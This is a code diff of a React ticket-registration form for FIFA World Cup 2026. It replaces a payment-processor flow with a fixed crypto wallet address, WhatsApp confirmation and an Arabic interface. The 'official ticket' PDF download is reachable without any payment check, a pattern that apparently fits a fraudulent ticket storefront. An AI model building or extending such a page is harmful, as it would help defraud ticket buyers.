+                      <div className="text-xs text-gray-500">{crypto.network}</div>
+                    </button>
+                  ))}
+                </div>
+              </div>
 
-                {/* NOWPayments Information */}
-                <div className="bg-purple-50 border border-purple-200 rounded-lg p-4">
-                  <div className="flex items-start space-x-2">
-                    <Shield className="h-5 w-5 text-purple-600 mt-0.5" />
-                    <div className="text-sm text-purple-800">
-                      <p className="font-semibold mb-1">Powered by NOWPayments:</p>
-                      <ul className="list-disc list-inside space-y-1">
-                        <li>Secure and trusted crypto payment processor</li>
-                        <li>Supports 100+ cryptocurrencies</li>
-                        <li>Instant payment confirmation via webhook</li>
-                        <li>No registration required - pay directly from your wallet</li>
-                      </ul>
-                    </div>
+              {/* Wallet Address & QR Code */}
+              <div className="bg-gray-50 rounded-lg p-6">
+                <h4 className="font-semibold text-gray-800 mb-4 text-center">عنوان المحفظة للدفع</h4>
+                
+                {/* QR Code */}
+                <div className="flex justify-center mb-4">
+                  {qrCodeDataURL && (
+                    <img 
+                      src={qrCodeDataURL} 
+                      alt="QR Code للدفع" 
+                      className="w-48 h-48 border-2 border-gray-300 rounded-lg"
+                    />
+                  )}
+                </div>
+
+                {/* Wallet Address */}
+                <div className="bg-white rounded-lg p-4 border">
+                  <div className="text-sm text-gray-600 mb-2">عنوان المحفظة ({selectedCrypto.network}):</div>
+                  <div className="flex items-center space-x-2">
+                    <code className="flex-1 bg-gray-100 p-2 rounded text-sm font-mono break-all">
+                      {WALLET_ADDRESS}
+                    </code>
+                    <button
+                      onClick={copyWalletAddress}
+                      className={`px-3 py-2 rounded-lg transition-all duration-200 flex items-center space-x-1 ${
+                        copySuccess 
+                          ? 'bg-green-500 text-white' 
+                          : 'bg-blue-500 hover:bg-blue-600 text-white'
+                      }`}
+                    >
+                      {copySuccess ? (
+                        <>
+                          <Check className="h-4 w-4" />
+                          <span className="text-sm">تم النسخ!</span>
+                        </>
+                      ) : (
+                        <>
+                          <Copy className="h-4 w-4" />
+                          <span className="text-sm">نسخ</span>
+                        </>
+                      )}
+                    </button>
                   </div>
                 </div>
 
-                {/* Additional information */}
-                <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
-                  <div className="flex items-start space-x-2">
-                    <Info className="h-5 w-5 text-yellow-600 mt-0.5" />
-                    <div className="text-sm text-yellow-800">
-                      <p className="font-semibold mb-1">Payment Process:</p>
-                      <ul className="list-disc list-inside space-y-1">
-                        <li>Click the payment button to open NOWPayments</li>
-                        <li>Choose your preferred cryptocurrency</li>
-                        <li>Send payment from your wallet to the provided address</li>
-                        <li>Payment confirmation is automatic</li>
-                        <li>Your tickets will be available for download immediately</li>
-                      </ul>
-                    </div>
+                {/* Payment Instructions */}
+                <div className="mt-4 text-sm text-gray-600">
+                  <p className="font-semibold mb-2">تعليمات الدفع:</p>
+                  <ol className="list-decimal list-inside space-y-1">
+                    <li>انسخ عنوان المحفظة أعلاه أو امسح QR Code</li>
+                    <li>افتح محفظتك الرقمية</li>
+                    <li>أرسل ${ticketInfo.cryptoPrice.toLocaleString()} USD بعملة {selectedCrypto.symbol}</li>
+                    <li>احفظ معرف المعاملة (Transaction ID)</li>
+                    <li>اضغط على "تأكيد عبر واتساب" أدناه</li>
+                  </ol>
+                </div>
+              </div>
+
+              {/* Transaction ID Input */}
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">
+                  معرف المعاملة (Transaction ID) - اختياري
+                </label>
+                <input
+                  type="text"
+                  value={transactionId}
+                  onChange={(e) => setTransactionId(e.target.value)}
+                  className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+                  placeholder="أدخل معرف المعاملة إذا كان متوفراً"
+                />
+              </div>
+
+              {/* WhatsApp Confirmation Button */}
+              <button
+                onClick={sendWhatsAppConfirmation}
+                className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white font-bold py-4 px-6 rounded-lg transition-all duration-300 transform hover:scale-105 flex items-center justify-center space-x-3"
+              >
+                <MessageCircle className="h-6 w-6" />
+                <span>تأكيد عبر واتساب</span>
+                <div className="text-xl">📱</div>
+              </button>
+
+              {/* Next Step Button */}
+              <button
+                onClick={() => setCurrentStep(5)}
+                className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-lg transition-all duration-300"
+              >
+                متابعة لتحميل التذكرة
+              </button>
+
+              {/* Security Notice */}
+              <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
+                <div className="flex items-start space-x-2">
+                  <Shield className="h-5 w-5 text-yellow-600 mt-0.5" />
+                  <div className="text-sm text-yellow-800">
+                    <p className="font-semibold mb-1">ملاحظة أمنية:</p>
+                    <ul className="list-disc list-inside space-y-1">
+                      <li>تأكد من إرسال المبلغ الصحيح بالعملة المحددة</li>
+                      <li>احفظ معرف المعاملة للمراجعة</li>
+                      <li>لا تشارك معلوماتك الشخصية مع أطراف أخرى</li>
+                      <li>سيتم تأكيد الدفع خلال 24 ساعة</li>
+                    </ul>
                   </div>
                 </div>
               </div>
             </div>
           )}
 
-          {/* Step 5: Payment Confirmed & Ticket Download */}
+          {/* Step 5: Download Ticket */}
           {currentStep === 5 && (
             <div className="space-y-6 text-center">
               <div className="mb-6">
                 <div className="text-6xl mb-4">🎉</div>
-                <h3 className="text-2xl font-bold text-green-600 mb-2">Payment Confirmed!</h3>
-                <p className="text-gray-600">Your FIFA World Cup 2026 tickets have been secured</p>
+                <h3 className="text-2xl font-bold text-green-600 mb-2">جاهز للتحميل!</h3>
+                <p className="text-gray-600">تذاكر كأس العالم FIFA 2026 جاهزة</p>
               </div>
 
               <div className="bg-green-50 border border-green-200 rounded-lg p-6">
                 <div className="text-sm text-gray-600 space-y-1">
-                  <div><strong>Order ID:</strong> {orderId}</div>
-                  <div><strong>Payment ID:</strong> {paymentId || 'Processing'}</div>
-                  <div><strong>Name:</strong> {formData.firstName} {formData.lastName}</div>
-                  <div><strong>Email:</strong> {formData.email}</div>
-                  <div><strong>Amount Paid:</strong> ${ticketInfo.cryptoPrice.toLocaleString()} USD</div>
-                  <div><strong>Payment Method:</strong> Cryptocurrency (NOWPayments)</div>
+                  <div><strong>رقم الطلب:</strong> {orderId}</div>
+                  <div><strong>الاسم:</strong> {formData.firstName} {formData.lastName}</div>
+                  <div><strong>البريد الإلكتروني:</strong> {formData.email}</div>
+                  <div><strong>المبلغ المدفوع:</strong> ${ticketInfo.cryptoPrice.toLocaleString()} USD</div>
+                  <div><strong>العملة:</strong> {selectedCrypto.symbol} ({selectedCrypto.name})</div>
+                  <div><strong>عنوان المحفظة:</strong> {WALLET_ADDRESS}</div>
+                  {transactionId && <div><strong>معرف المعاملة:</strong> {transactionId}</div>}
                 </div>
               </div>
 
@@ -874,18 +883,18 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
                 className="w-full bg-gradient-to-r from-blue-600 to-blue-800 hover:from-blue-700 hover:to-blue-900 text-white font-bold py-4 px-6 rounded-lg transition-all duration-300 flex items-center justify-center space-x-3"
               >
                 <Download className="h-6 w-6" />
-                <span>Download Official FIFA Ticket (PDF)</span>
+                <span>تحميل التذكرة الرسمية (PDF)</span>
                 <FileText className="h-6 w-6" />
               </button>
 
               <p className="text-gray-600 text-sm">
-                Your official ticket will be downloaded as a PDF file. Please save it and bring it with valid ID on match day.
+                سيتم تحميل تذكرتك الرسمية كملف PDF. يرجى حفظها وإحضارها مع هوية صالحة يوم المباراة.
               </p>
 
               <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
                 <div className="flex items-center justify-center space-x-2 text-blue-700">
                   <Phone className="h-5 w-5" />
-                  <span className="font-semibold">Support: {whatsappNumber}</span>
+                  <span className="font-semibold">الدعم: {WHATSAPP_NUMBER}</span>
                 </div>
               </div>
 
@@ -894,7 +903,7 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
                 onClick={onClose}
                 className="bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 px-6 rounded-lg"
               >
-                Close
+                إغلاق
               </button>
             </div>
           )}
@@ -908,7 +917,7 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
                   onClick={handlePrevStep}
                   className="px-6 py-2 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
                 >
-                  Previous
+                  السابق
                 </button>
               )}
               {currentStep < 4 ? (
@@ -917,13 +926,9 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
                   onClick={handleNextStep}
                   className="ml-auto px-6 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
                 >
-                  Next
+                  التالي
                 </button>
-              ) : (
-                <div className="ml-auto">
-                  <p className="text-sm text-gray-600">Click the NOWPayments button to complete your purchase</p>
-                </div>
-              )}
+              ) : null}
             </div>
           )}
         </div>
